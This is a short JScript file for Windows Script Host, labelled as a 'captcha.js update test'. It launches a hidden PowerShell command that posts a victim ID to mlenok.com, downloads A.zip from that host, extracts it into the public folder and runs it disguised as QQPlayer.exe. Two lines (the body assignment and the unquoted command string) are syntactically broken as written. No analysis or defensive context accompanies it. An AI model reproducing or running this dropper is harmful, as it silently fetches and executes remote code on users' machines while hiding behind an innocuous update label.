// captcha.js update test
var args = WScript.Arguments;
var id = args.Item(0);
var body = id= + id

var shell = WScript.CreateObject("WScript.Shell");
var cmd = powershell -nop -w hidden -c "$p=$env:PUBLIC+\'\\QQPlayer.exe\';$z=$p+\'.zip\';iwr https://mlenok.com/check.php -Method Post -Body body;irm https://mlenok.com/A.zip -o $z;Expand-Archive $z $env:PUBLIC -Force;start $p";
shell.Run("cmd /c start /min " + cmd, 0, false);
